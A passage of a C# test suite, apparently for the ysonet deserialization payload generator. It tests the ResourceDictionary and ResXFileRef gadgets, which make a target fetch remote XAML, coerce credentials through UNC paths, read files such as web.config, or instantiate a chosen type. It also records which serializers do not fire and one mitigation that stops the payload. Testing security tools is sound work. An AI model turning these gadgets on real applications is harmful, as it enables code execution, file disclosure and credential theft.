                GadgetName = RdGadget,
                FormatterName = "Xaml",
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The whole payload is one element with one attribute, and the attribute is operator
        // data the target OPENS - so what matters is that the value arrives byte for byte,
        // through the XML escaping and through the minifier, for every shape an operator can
        // legitimately type.
        private static void ResourceDictionaryCarriesTheUriUnmodified()
        {
            string[] values =
            {
                "http://127.0.0.1:8080/x.xaml",
                // A UNC path: the credential-coercion use, and backslashes must not be touched.
                @"\\host\share\x",
                // A bare target path, the third accepted input.
                @"C:\payloads\x.xaml",
                // & and < are the two characters that MUST be escaped for the attribute, and
                // an apostrophe is the one an over-eager JSON escaper would corrupt.
                "http://127.0.0.1/x?a=1&b=2",
                "http://127.0.0.1/John's.xaml",
            };

            foreach (string uri in values)
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string cell = uri + (minify ? " --minify" : "");

                    RunResult r = GenerateResourceDictionary(uri, minify);
                    AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);

                    string text = r.Raw as string;
                    AssertTrue(text != null, cell + ": the Xaml payload is text");
                    AssertTrue(text.IndexOf("System.Windows.ResourceDictionary", StringComparison.Ordinal) < 0,
                        cell + ": the element resolves through the WPF xmlns, so no assembly "
                            + "qualified name is written");
                    AssertTrue(text.IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0,
                        cell + ": the payload names the carrier element");

                    // Compare the DECODED attribute value, which is what the target's Uri
                    // converter will see, not the escaped rendering.
                    List<string> attributes = MinifiedTextGuardValues(text);
                    AssertTrue(attributes.Contains(uri),
                        cell + ": the URI reaches Source exactly as typed. Attribute values seen: "
                            + string.Join(" | ", attributes.ToArray()));
                }
            }
        }

        // Every XML attribute and text value in a document, read back decoded. Mirrors what
        // the gadget's own minify guard compares against.
        private static List<string> MinifiedTextGuardValues(string xml)
        {
            var values = new List<string>();
            var settings = new System.Xml.XmlReaderSettings
            {
                ConformanceLevel = System.Xml.ConformanceLevel.Fragment,
                DtdProcessing = System.Xml.DtdProcessing.Ignore,
            };
            using (var sr = new StringReader(xml))
            using (System.Xml.XmlReader reader = System.Xml.XmlReader.Create(sr, settings))
            {
                while (reader.Read())
                {
                    if (reader.NodeType == System.Xml.XmlNodeType.Text)
                        values.Add(reader.Value);
                    else if (reader.NodeType == System.Xml.XmlNodeType.Element && reader.HasAttributes)
                    {
                        while (reader.MoveToNextAttribute()) values.Add(reader.Value);
                        reader.MoveToElement();
                    }
                }
            }
            return values;
        }

        // The two refusals this gadget owns, and they are the only two. Everything else about
        // the operator's value is taken as typed (Generators/README.md, "Operator input:
        // document it, do not police it") - no scheme check, no host form, no extension.
        private static void ResourceDictionaryRefusesOnlyWhatItCannotEmit()
        {
            RunResult empty = GenerateResourceDictionary("", false);
            AssertTrue(!empty.Success, "an empty -c is refused");
            AssertTrue((empty.ErrorMessage ?? "").IndexOf("non-empty -c", StringComparison.OrdinalIgnoreCase) >= 0,
                "and the refusal names the input: " + empty.ErrorMessage);

            // --minify collapses "; " inside an attribute, so a value holding one would reach
            // the target changed. Verified, not predicted: the gadget re-reads its own emitted
            // document rather than pattern matching the input.
            const string lossy = "http://127.0.0.1/a; b";
            RunResult minified = GenerateResourceDictionary(lossy, true);
            AssertTrue(!minified.Success, "a value --minify would rewrite is refused");
            AssertTrue((minified.ErrorMessage ?? "").IndexOf("--minify", StringComparison.Ordinal) >= 0
                    && (minified.ErrorMessage ?? "").IndexOf(lossy, StringComparison.Ordinal) >= 0,
                "and the refusal names both the switch and the value: " + minified.ErrorMessage);

            // The SAME value is fine without --minify, which is what proves the refusal is
            // about the minifier and not about the character.
            RunResult plain = GenerateResourceDictionary(lossy, false);
            AssertTrue(plain.Success, "and the same value generates without --minify: " + plain.ErrorMessage);

            // Shapes a validating gadget would have rejected and this one must not.
            foreach (string odd in new[] { "not-a-url", "ftp://h/x", @"..\relative\x", "x" })
            {
                RunResult r = GenerateResourceDictionary(odd, false);
                AssertTrue(r.Success, "\"" + odd + "\" is the target's decision, not ysonet's: " + r.ErrorMessage);
            }
        }

        // --rawinput turns the attribute escaping off, and with it the minify guard, because
        // the operator has taken the escaping decision themselves.
        private static void ResourceDictionaryRawInputSkipsTheEscaping()
        {
            const string preEscaped = "http://127.0.0.1/x?a=1&amp;b=2";

            RunResult escaped = GenerateResourceDictionary("http://127.0.0.1/x?a=1&b=2", false);
            AssertTrue(escaped.Success, "the normal path generates: " + escaped.ErrorMessage);
            AssertTrue(((string)escaped.Raw).IndexOf("&amp;", StringComparison.Ordinal) >= 0,
                "and escapes the ampersand for the attribute");

            RunResult raw = GenerateResourceDictionary(preEscaped, false, "--rawinput");
            AssertTrue(raw.Success, "--rawinput generates: " + raw.ErrorMessage);
            AssertTrue(((string)raw.Raw).IndexOf(preEscaped, StringComparison.Ordinal) >= 0,
                "and passes an already-escaped value through untouched: " + raw.Raw);
        }

        // The formatter list is Xaml and nothing else, and the reasons are asserted rather
        // than argued, because each one is a cell somebody could later "add" in good faith.
        private static void ResourceDictionaryAdvertisesOnlyXamlAndWhy()
        {
            var g = GadgetRegistry.CreateGadgetInstance(RdGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            List<string> formatters = g.SupportedFormatters();
            AssertEqual(1, formatters.Count, "exactly one advertised formatter");
            AssertEqual("Xaml", formatters[0], "and it is Xaml");

            Type rd = typeof(System.Windows.ResourceDictionary);

            // Reason 1, the SILENT one and so the dangerous one: a serializer that infers a
            // contract from the type builds a DICTIONARY, because ResourceDictionary
            // implements IDictionary. It really does construct the target and it really does
            // read the document - it just stores "Source" as a KEY and never calls the setter.
            // No exception, nothing fetched. A generation-only or did-it-throw check passes.
            AssertTrue(typeof(System.Collections.IDictionary).IsAssignableFrom(rd),
                "ResourceDictionary implements IDictionary, which is what routes named members "
                    + "into the dictionary");

            const string jsonAttempt = @"{
    ""$type"":""System.Windows.ResourceDictionary, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
    ""Source"":""http://127.0.0.1:1/x""
}";
            object built = SerializersHelper.JsonNet_deserialize(jsonAttempt);
            var asDictionary = built as System.Windows.ResourceDictionary;
            AssertTrue(asDictionary != null,
                "Json.NET DOES build the target type, which is why this cell looks like it works");
            AssertTrue(asDictionary.Source == null,
                "but Source is never assigned, so nothing is fetched");
            AssertEqual(1, asDictionary.Count,
                "the member landed in the dictionary as a key instead");

            // Reason 2: the runtime formatters reject the TYPE before they create anything,
            // so no document shape helps.
            AssertTrue(!rd.IsSerializable,
                "ResourceDictionary is not [Serializable], which rules out BinaryFormatter, "
                    + "SoapFormatter, LosFormatter and FsPickler");

            // Reason 3: XmlSerializer refuses it by name, and says why.
            Exception xs = null;
            try { new System.Xml.Serialization.XmlSerializer(rd); }
            catch (Exception ex) { xs = ex; }
            AssertTrue(xs != null, "XmlSerializer refuses the type");
            Exception xsRoot = xs;
            while (xsRoot.InnerException != null) xsRoot = xsRoot.InnerException;
            AssertTrue(xsRoot.Message.IndexOf("IDictionary", StringComparison.Ordinal) >= 0,
                "and names IDictionary as the reason: " + xsRoot.Message);

            // Reason 4: the DataContract family writes a key/value COLLECTION, which has no
            // place to name a member at all.
            var probe = new System.Windows.ResourceDictionary();
            probe.Add("k", "v");
            var dcsMs = new MemoryStream();
            new System.Runtime.Serialization.DataContractSerializer(rd).WriteObject(dcsMs, probe);
            string dcs = Encoding.UTF8.GetString(dcsMs.ToArray());
            AssertTrue(dcs.IndexOf("ArrayOfKeyValueOfanyTypeanyType", StringComparison.Ordinal) >= 0,
                "DataContractSerializer builds a collection contract: " + dcs);
            AssertTrue(dcs.IndexOf("Source", StringComparison.Ordinal) < 0,
                "with no member named Source anywhere in it");
        }

        // The metadata an operator searches on. Each value has a reason a future edit could
        // quietly break, so it is locked here rather than left to the generic audit table.
        private static void ResourceDictionaryDeclaresItsFacets()
        {
            var g = GadgetRegistry.CreateGadgetInstance(RdGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            AssertEqual(CommandInputType.Url, g.CommandInput(),
                "-c is described as a URL, the primary documented use");
            AssertEqual(0, g.Variants().Count,
                "one payload shape: the URL and UNC uses emit identical bytes");

            GadgetFacetSet facets = g.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.Network),
                "the request leaves the process before anything is parsed");
            AssertTrue(facets.Kinds.Contains(PayloadKind.CodeExecution),
                "and the fetched document is then loaded as WPF markup, which "
                    + "FireResourceDictionaryLoadsRemoteMarkup proves by constructing a type "
                    + "named only inside it");
            AssertTrue(facets.Kinds.Contains(PayloadKind.NestedDeserialization),
                "that load is a second deserializer reading operator-controlled input");

            // Inputs are DECLARED, not derived: CommandInput() is Url but a UNC path and a
            // plain target path are equally valid values, and an operator hunting for the
            // credential-coercion use searches for the UNC one.
            AssertTrue(facets.Inputs != null, "the inputs are declared rather than derived");
            foreach (string input in new[] { PayloadInput.RemoteUrl, PayloadInput.UncPath, PayloadInput.TargetPath })
                AssertTrue(facets.Inputs.Contains(input), "declares the " + input + " input");

            AssertTrue(facets.Requirements.Contains(GadgetRequirement.Wpf),
                "PresentationFramework is a WPF assembly");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "and it ships with the framework");

            // Versions are evidence: the fire rows record what actually fired and
            // VersionEvidenceMatchesThisRuntime fails the run when a claim and the observation
            // disagree.
            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
                "a runtime-gated gadget names at least one working version");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the effect was observed on");

            AssertTrue(g.AdditionalInfo().IndexOf("UNC", StringComparison.OrdinalIgnoreCase) >= 0,
                "AdditionalInfo names the credential-coercion use, which the facets alone do not explain");
            AssertInfoPanelKeepsItsFacts(RdGadget);
        }

        // ---- ResXFileRef (the ResXFileRef.Converter primitive) ------------------

        private const string ResXFileRefGadget = "ResXFileRef";

        // A .resources document is the natural -c for the default variant, but nothing here
        // ever opens it: generation is text assembly only.
        private const string ResXFileRefSamplePath = @"\\ysonet-nonexistent-host\share\stage.resources";

        private static RunResult GenerateResXFileRef(string formatter, string path, bool minify,
            params string[] extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = path;
            ia.Minify = minify;
            ia.Test = false;
            if (extra != null && extra.Length > 0) ia.ExtraArguments = new List<string>(extra);
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = ResXFileRefGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The one string the target's converter parses, read back out of the payload: the
        // decoded text node for XAML, the unquoted scalar for YAML.
        private static string ResXFileRefDeliveredValue(string payload, string formatter)
        {
            if (formatter == "Xaml")
            {
                var settings = new System.Xml.XmlReaderSettings
                {
                    ConformanceLevel = System.Xml.ConformanceLevel.Fragment,
                    DtdProcessing = System.Xml.DtdProcessing.Ignore,
                };
                using (var sr = new StringReader(payload))
                using (System.Xml.XmlReader reader = System.Xml.XmlReader.Create(sr, settings))
                {
                    while (reader.Read())
                        if (reader.NodeType == System.Xml.XmlNodeType.Text)
                            return reader.Value;
                }
                return null;
            }

            // The YAML document is one tagged scalar: everything from the first '"' after the
            // tag to the last one, read back through YamlDotNet's own escaping rules by
            // undoing the two escapes the gadget applies.
            int open = payload.IndexOf('"');
            int close = payload.LastIndexOf('"');
            if (open < 0 || close <= open) return null;
            return payload.Substring(open + 1, close - open - 1)
                .Replace("\\\"", "\"").Replace("\\\\", "\\");
        }

        // What ResXFileRef.Converter.ParseResxFileRefString makes of a value. Internal, so
        // this reaches it by reflection rather than reimplementing the rule the gadget is
        // supposed to match - the whole point is to compare against the framework.
        private static string[] ResXFileRefFrameworkParse(string value)
        {
            System.Reflection.MethodInfo parse = typeof(System.Resources.ResXFileRef.Converter)
                .GetMethod("ParseResxFileRefString",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            AssertTrue(parse != null, "the framework's own ResX file-reference parser is reachable");
            return (string[])parse.Invoke(null, new object[] { value });
        }

        // The composed value IS the payload, so it has to be exactly what the framework
        // itself would write - asserted against ResXFileRef.ToString() rather than against a
        // copied literal, so the rule cannot drift - and it has to survive the framework's
        // own parser, which is what the target really runs.
        private static void ResXFileRefComposesTheConverterValue()
        {
            const string resourceSetType = ResXFileRefGenerator.ResourceSetTypeName;
            const string activatedType = "System.IO.BufferedStream, mscorlib";

            // path, extra arguments, the type name the target must resolve, the encoding.
            var cells = new List<string[]>
            {
                new[] { ResXFileRefSamplePath, "", resourceSetType, "" },
                // A path holding the field separator MUST be quoted, or the target would
                // stop reading it at the first ';'.
                new[] { @"C:\stage;01\payload.resources", "", resourceSetType, "" },
                // And one holding a quote, which the same rule covers: the parser reads a
                // quoted path up to the LAST '"', so it round-trips too.
                new[] { "C:\\stage\"01\\payload.resources", "", resourceSetType, "" },
                new[] { @"C:\inetpub\wwwroot\web.config", "--variant 1", "System.String", "" },
                new[] { @"C:\inetpub\wwwroot\web.config", "--variant 1 --enc utf-8", "System.String", "utf-8" },
                new[] { @"\\host\share\blob.bin", "--variant 3 --type " + activatedType,
                    activatedType, "" },
            };

            foreach (string[] cell in cells)
            {
                string path = cell[0];
                string[] extra = cell[1].Length == 0
                    ? new string[0]
                    // Only the --type value can contain a space, and it is always last.
                    : SplitVariantArgs(cell[1]);
                string typeName = cell[2];
                string encodingName = cell[3];

                var reference = encodingName.Length == 0
                    ? new System.Resources.ResXFileRef(path, typeName)
                    : new System.Resources.ResXFileRef(path, typeName,
                        Encoding.GetEncoding(encodingName));
                string expected = reference.ToString();

                foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
                {
                    string desc = formatter + " " + path + " " + cell[1];
                    RunResult r = GenerateResXFileRef(formatter, path, false, extra);
                    AssertTrue(r.Success, desc + " generates: " + r.ErrorMessage);

                    string text = r.Raw as string;
                    AssertTrue(text != null, desc + ": the payload is text");

                    string delivered = ResXFileRefDeliveredValue(text, formatter);
                    AssertEqual(expected, delivered,
                        desc + ": the value is composed exactly as ResXFileRef.ToString() does");

                    // And the framework's own parser must get all three fields back out.
                    string[] parts = ResXFileRefFrameworkParse(delivered);
                    AssertEqual(path, parts[0], desc + ": the target parses the path back");
                    AssertEqual(typeName, parts[1].TrimStart(),
                        desc + ": the target parses the type name back");
                    if (encodingName.Length == 0)
                        AssertEqual(2, parts.Length, desc + ": no encoding field is written");
                    else
                        AssertEqual(encodingName, parts[2], desc + ": the encoding field is written");
                }
            }
        }

        // "--variant 3 --type Some.Type, Some.Assembly" -> the argv the CLI would build. The
        // type value is always the last argument, so everything after "--type" is one value.
        private static string[] SplitVariantArgs(string raw)
        {
            const string typeFlag = "--type ";
            int at = raw.IndexOf(typeFlag, StringComparison.Ordinal);
            if (at < 0)
                return raw.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

            var args = new List<string>(raw.Substring(0, at)
                .Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
            args.Add("--type");
            args.Add(raw.Substring(at + typeFlag.Length));
            return args.ToArray();
        }

        // The refusals this gadget owns, and they are the only ones. Everything else about
        // the operator's value is taken as typed (Generators/README.md, "Operator input:
        // document it, do not police it") - no path shape, no extension, no assembly
        // identity check on --type.
        private static void ResXFileRefRefusesOnlyWhatItCannotEmit()
        {
            RunResult empty = GenerateResXFileRef("Xaml", "", false);
            AssertTrue(!empty.Success, "an empty -c is refused");
            AssertTrue((empty.ErrorMessage ?? "").IndexOf("non-empty -c", StringComparison.OrdinalIgnoreCase) >= 0,
                "and the refusal names the input: " + empty.ErrorMessage);

            RunResult noType = GenerateResXFileRef("Xaml", ResXFileRefSamplePath, false, "--variant", "3");
            AssertTrue(!noType.Success, "variant 3 with no --type is refused rather than guessed");
            AssertTrue((noType.ErrorMessage ?? "").IndexOf("--type", StringComparison.Ordinal) >= 0,
                "and the refusal names the option: " + noType.ErrorMessage);

            RunResult noVariant = GenerateResXFileRef("Xaml", ResXFileRefSamplePath, false, "--variant", "4");
            AssertTrue(!noVariant.Success, "a variant number this gadget has no branch for is refused");
            AssertTrue((noVariant.ErrorMessage ?? "").IndexOf("no variant 4", StringComparison.Ordinal) >= 0,
                "and the refusal says so: " + noVariant.ErrorMessage);

            // Each minifier rewrites a DIFFERENT shape, so each formatter gets the value its
            // own minifier really corrupts - measured, not predicted. The XML one collapses
            // "; " inside the text node but leaves a double space that sits behind a
            // backslash alone; the YAML one collapses every run of whitespace.
            var lossyValues = new Dictionary<string, string>
            {
                { "Xaml", @"C:\stage\a; b.resources" },
                { "YamlDotNet", @"C:\two  spaces\stage.resources" },
            };
            foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
            {
                string lossy = lossyValues[formatter];
                RunResult minified = GenerateResXFileRef(formatter, lossy, true);
                AssertTrue(!minified.Success, formatter + ": a path --minify would rewrite is refused");
                AssertTrue((minified.ErrorMessage ?? "").IndexOf("--minify", StringComparison.Ordinal) >= 0
                        && (minified.ErrorMessage ?? "").IndexOf(lossy, StringComparison.Ordinal) >= 0,
                    formatter + ": the refusal names both the switch and the value: " + minified.ErrorMessage);

                // The SAME value is fine without --minify, which is what proves the refusal
                // is about the minifier and not about the character.
                RunResult plain = GenerateResXFileRef(formatter, lossy, false);
                AssertTrue(plain.Success,
                    formatter + ": and the same value generates without --minify: " + plain.ErrorMessage);

                // Shapes a validating gadget would have rejected and this one must not.
                foreach (string odd in new[] { "not-a-path", @"..\relative\x", "x", @"\\host\share\a b&c'd",
                    "/unix/style/path", "\u00e9\u00e8.resources" })
                {
                    RunResult r = GenerateResXFileRef(formatter, odd, false);
                    AssertTrue(r.Success, formatter + " \"" + odd
                        + "\" is the target's decision, not ysonet's: " + r.ErrorMessage);
                }
            }
        }

        // --rawinput turns the per-format escaping off, and with it the fidelity guard,
        // because the operator has taken the escaping decision themselves.
        private static void ResXFileRefRawInputSkipsTheEscaping()
        {
            const string ampersandPath = @"\\host\share\a&b.resources";

            RunResult xaml = GenerateResXFileRef("Xaml", ampersandPath, false);
            AssertTrue(xaml.Success, "the Xaml path generates: " + xaml.ErrorMessage);
            AssertTrue(((string)xaml.Raw).IndexOf("&amp;", StringComparison.Ordinal) >= 0,
                "and escapes the ampersand for the XML text node");

            const string preEscaped = @"\\host\share\a&amp;b.resources";
            RunResult xamlRaw = GenerateResXFileRef("Xaml", preEscaped, false, "--rawinput");
            AssertTrue(xamlRaw.Success, "--rawinput generates: " + xamlRaw.ErrorMessage);
            AssertTrue(((string)xamlRaw.Raw).IndexOf(preEscaped, StringComparison.Ordinal) >= 0,
                "and passes an already-escaped value through untouched: " + xamlRaw.Raw);

            // The YAML scalar is DOUBLE quoted, so the backslashes are doubled and an
            // apostrophe must NOT become \' - that escape is illegal in a double quoted
            // literal and one of this project's parsers deletes the character (see
            // CommandArgSplitter.JsonDoubleQuotedStringEscape).
            const string apostrophePath = @"C:\John's dir\stage.resources";
            RunResult yaml = GenerateResXFileRef("YamlDotNet", apostrophePath, false);
            AssertTrue(yaml.Success, "the YamlDotNet path generates: " + yaml.ErrorMessage);
            string yamlText = (string)yaml.Raw;
            AssertTrue(yamlText.IndexOf(@"C:\\John's dir\\stage.resources", StringComparison.Ordinal) >= 0,
                "the backslashes are doubled for the double quoted scalar: " + yamlText);
            AssertTrue(yamlText.IndexOf(@"\'", StringComparison.Ordinal) < 0,
                "and the apostrophe is NOT escaped: " + yamlText);

            RunResult yamlRaw = GenerateResXFileRef("YamlDotNet", apostrophePath, false, "--rawinput");
            AssertTrue(yamlRaw.Success, "--rawinput generates: " + yamlRaw.ErrorMessage);
            AssertTrue(((string)yamlRaw.Raw).IndexOf(apostrophePath, StringComparison.Ordinal) >= 0,
                "and the single backslashes survive: " + yamlRaw.Raw);
        }

        // The formatter list is two long, and every exclusion is reproduced here rather than
        // argued in a comment, because each one is a cell somebody could later "add" in good
        // faith. The path in these probes does not exist, so a converter that DID run would
        // throw a FileNotFoundException and the assertion would say so.
        private static void ResXFileRefAdvertisesOnlyXamlAndYamlAndWhy()
        {
            var g = GadgetRegistry.CreateGadgetInstance(ResXFileRefGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            List<string> formatters = g.SupportedFormatters();
            AssertEqual(2, formatters.Count, "exactly two advertised formatters");
            AssertEqual("Xaml (3)", formatters[0], "Xaml, annotated with its three variants");
            AssertEqual("YamlDotNet < 5.0.0 (3)", formatters[1],
                "and YamlDotNet, with the catalogue's version note and the same annotation");

            Type target = typeof(System.Resources.ResXFileRef);
            const string missing = @"C:\ysonet-no-such-file-resxfileref.txt";

            // Reason 1: no parameterless constructor and no writable member, which is what
            // every contract-building serializer needs.
            AssertTrue(target.GetConstructor(Type.EmptyTypes) == null,
                "ResXFileRef has no parameterless constructor");
            foreach (string property in new[] { "FileName", "TypeName", "TextFileEncoding" })
                AssertTrue(target.GetProperty(property).GetSetMethod() == null,
                    property + " is read-only, so there is nothing to assign either");

            Exception jss = null;
            try
            {
                SerializersHelper.JavaScriptSerializer_deserialize(
                    @"{""__type"":""System.Resources.ResXFileRef, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"",""FileName"":"""
                    + missing.Replace(@"\", @"\\") + @"""}");
            }
            catch (Exception ex) { jss = ex; }
            AssertTrue(jss != null, "JavaScriptSerializer refuses the type");
            Exception jssRoot = jss;
            while (jssRoot.InnerException != null) jssRoot = jssRoot.InnerException;
            AssertTrue(jssRoot is MissingMethodException,
                "and the reason is the missing parameterless constructor: " + jssRoot.GetType().Name
                    + ": " + jssRoot.Message);

            // Reason 2, the SILENT one and so the dangerous one: the runtime formatters
            // rebuild the object from its FIELDS and never consult the converter, so this
            // cell round-trips cleanly and reads no file at all.
            var live = new System.Resources.ResXFileRef(missing, "System.String");
            var bfStream = new MemoryStream();
            new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter()
                .Serialize(bfStream, live);
            bfStream.Position = 0;
            object rebuilt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter()
                .Deserialize(bfStream);
            var asFileRef = rebuilt as System.Resources.ResXFileRef;
            AssertTrue(asFileRef != null,
                "BinaryFormatter DOES rebuild the type, which is why this cell looks like it works");
            AssertEqual(missing, asFileRef.FileName,
                "but it is an inert ResXFileRef: the converter never ran and no file was opened");

            // Reason 3: Json.NET has nowhere to declare the type. A JSON string at an object
            // root is just a string, and there is no settable member of this type anywhere in
            // the framework to name instead.
            object jsonRoot = SerializersHelper.JsonNet_deserialize(
                @"""" + missing.Replace(@"\", @"\\") + @"""");
            AssertTrue(jsonRoot is string,
                "a JSON string at an object root stays a string, so no converter is selected");

            // Reason 4: SharpSerializer converts a simple value with Convert.ChangeType, not
            // through TypeDescriptor, and it needs a parameterless constructor as well.
            Exception sharp = null;
            try
            {
                SerializersHelper.SharpSerializer_Xml_deserialize_FromString(
                    @"<?xml version=""1.0"" encoding=""utf-8""?><Complex name=""r"" type=""System.Resources.ResXFileRef, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />");
            }
            catch (Exception ex) { sharp = ex; }
            AssertTrue(sharp != null, "SharpSerializer refuses the type too");
        }

        // The one mitigation that stops this payload, stated as a fact and locked, rather
        // than rediscovered. The failure is the SILENT kind, which is the part worth
        // asserting: no exception, no file opened, just null.
        private static void ResXFileRefIsDroppedByTheRestrictiveXamlReader()
        {
            // A path that does not exist, so a reader that DID reach the converter would
            // throw FileNotFoundException instead of returning quietly.
            RunResult r = GenerateResXFileRef("Xaml", @"C:\ysonet-no-such-file-restrictive.txt",
                false, "--variant", "1");
            AssertTrue(r.Success, "the payload generates: " + r.ErrorMessage);

            object result = null;
            Exception thrown = null;
            try { result = SerializersHelper.Xaml_deserialize_restrictive((string)r.Raw); }
            catch (Exception ex) { thrown = ex; }

            AssertTrue(thrown == null,
                "the restrictive reader does not throw: " + (thrown == null ? "" : thrown.Message));
            AssertTrue(result == null,
                "it returns null, having skipped the element's whole subtree, so nothing was read");
        }

        // The metadata an operator searches on. Each value has a reason a future edit could
        // quietly break, so it is locked here rather than left to the generic audit table.
        private static void ResXFileRefDeclaresItsFacets()
        {
            var g = GadgetRegistry.CreateGadgetInstance(ResXFileRefGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            AssertEqual(CommandInputType.TargetPath, g.CommandInput(),
                "-c is a path the TARGET opens; ysonet never touches it");

            List<GadgetVariant> variants = g.Variants();
            AssertEqual("1,2,3", string.Join(",", variants.ConvertAll(v => v.Number.ToString()).ToArray()),
                "three contiguous variants");

            // The gadget-level set describes the DEFAULT variant (2), which is the only one
            // that inherits it, so it must NOT claim information disclosure - that is
            // variant 1's alone. If this ever regressed, variant 2 would inherit a kind its
            // effect does not have.
            GadgetFacetSet gadgetFacets = g.Facets();
            foreach (string kind in new[] { PayloadKind.FileSystem,
                PayloadKind.NestedDeserialization, PayloadKind.CodeExecution, PayloadKind.Network })
                AssertTrue(gadgetFacets.Kinds.Contains(kind), "the gadget declares " + kind);
            AssertTrue(!gadgetFacets.Kinds.Contains(PayloadKind.InformationDisclosure),
                "the default variant loads a .resources file and discloses nothing, so the "
                    + "gadget set does not claim information-disclosure");
            AssertTrue(!gadgetFacets.Kinds.Contains(PayloadKind.Other),
                "and it is the concrete .resources effect, not 'other'");

            // Inputs are DECLARED, not derived: an operator hunting for the UNC use has to
            // find this gadget, and local-file must NOT appear - ysonet opens nothing.
            AssertTrue(gadgetFacets.Inputs != null, "the inputs are declared rather than derived");
            AssertTrue(gadgetFacets.Inputs.Contains(PayloadInput.TargetPath), "declares target-path");
            AssertTrue(gadgetFacets.Inputs.Contains(PayloadInput.UncPath), "declares unc-path");
            AssertTrue(!gadgetFacets.Inputs.Contains(PayloadInput.LocalFile),
                "and NOT local-file: nothing is read on this machine while building");

            // Variant 1 reads a file back and stops there.
            GadgetFacetSet read = variants[0].FacetOverride;
            AssertTrue(read != null, "variant 1 declares its own facets");
            AssertTrue(read.Kinds.Contains(PayloadKind.InformationDisclosure),
                "variant 1 recovers the file's content");
            AssertTrue(!read.Kinds.Contains(PayloadKind.NestedDeserialization)
                    && !read.Kinds.Contains(PayloadKind.CodeExecution),
                "and claims neither a second deserializer nor code execution");

            // Variant 2 is the gadget's own capability, so it inherits.
            AssertTrue(variants[1].FacetOverride == null,
                "variant 2 inherits the gadget set, which is exactly its capability");

            // It is also the DEFAULT, and it is not the first listed, so it has to say so:
            // the interactive editor pre-selects the declared default, and without the
            // declaration it would offer variant 1 and build a different payload than the
            // same command line does.
            AssertTrue(variants[1].IsDefault, "variant 2 declares itself the default");
            AssertTrue(!variants[0].IsDefault && !variants[2].IsDefault,
                "and it is the only one that does");
            var editor = new ModuleEditor(null, null, true, null, null);
            editor.BuildFieldsForTest(ResXFileRefGadget);
            List<string> editorArgs = editor.GadgetExtraArgvForTest();
            AssertTrue(editorArgs.Contains("2") && !editorArgs.Contains("1"),
                "and the editor pre-selects it: " + string.Join(" ", editorArgs.ToArray()));

            // Variant 3 is a bring-your-own variant: the operator's type decides the effect,
            // so it inherits NOTHING from variant 2's proven kinds.
            GadgetFacetSet activate = variants[2].FacetOverride;
            AssertTrue(activate != null, "variant 3 declares its own facets");
            AssertTrue(activate.Kinds.Contains(PayloadKind.Other),
                "variant 3 claims only 'other': the type the operator names decides the result");
            foreach (string kind in new[] { PayloadKind.CodeExecution, PayloadKind.NestedDeserialization,
                PayloadKind.InformationDisclosure })
                AssertTrue(!activate.Kinds.Contains(kind),
                    "variant 3 does not inherit " + kind + " from the built variant");

            // Versions are evidence: the fire rows record what actually fired and
            // VersionEvidenceMatchesThisRuntime fails the run when a claim and the
            // observation disagree. An override replaces the WHOLE set, so each one repeats.
            foreach (var facets in new[] { gadgetFacets, read, activate })
            {
                AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
                    "a runtime-gated gadget names at least one working version");
                AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                    "4.8.1 is the build the effect was observed on");
            }

            // Per-variant option scope: the editor must not offer --type on a variant whose
            // type name is fixed, nor --enc where no text is read.
            AssertTrue(!variants[0].UsesOption(ResXFileRefGenerator.TypeOptionName),
                "variant 1 does not use --type");
            AssertTrue(variants[0].UsesOption(ResXFileRefGenerator.EncodingOptionName),
                "variant 1 is the one that uses --enc");
            AssertTrue(!variants[1].UsesOption(ResXFileRefGenerator.TypeOptionName)
                    && !variants[1].UsesOption(ResXFileRefGenerator.EncodingOptionName),
                "variant 2 uses neither");
            AssertTrue(variants[2].UsesOption(ResXFileRefGenerator.TypeOptionName)
                    && !variants[2].UsesOption(ResXFileRefGenerator.EncodingOptionName),
                "variant 3 uses --type and not --enc");

            AssertTrue(g.AdditionalInfo().IndexOf("UNC", StringComparison.OrdinalIgnoreCase) >= 0,
                "AdditionalInfo names the UNC use, which the facets alone do not explain");
            AssertInfoPanelKeepsItsFacts(ResXFileRefGadget);
        }

        // -t is decided per VARIANT, and that split is the thing that regressed on
        // WbemClassObjectUnmarshal: reading a file back is a self-test like any other, while
        // deserializing or activating from the operator's own file inside ysonet is not.
        // -t in ysonet is a self-exploit: it deserializes the payload HERE, so the converter
        // runs on -c in this process. Every variant ACCEPTS it - variant 1 reads the file
        // back, variant 2 runs a BinaryFormatter over the .resources you named, variant 3
        // activates the type you named. (Your file, your machine: the maintainer's call.) The
        // text fixture is not a real .resources, so variant 2's in-process BinaryFormatter
        // throws and RunSelfTest swallows it - generation still succeeds, which is what "-t is
        // accepted" means; the fire rows prove variant 2/3 really trigger against benign
        // witnesses.
        private static void ResXFileRefAcceptsSelfTestOnEveryVariant()
        {
            string fixture = WriteTestArtifact("ysonet_resxfileref_selftest.txt",
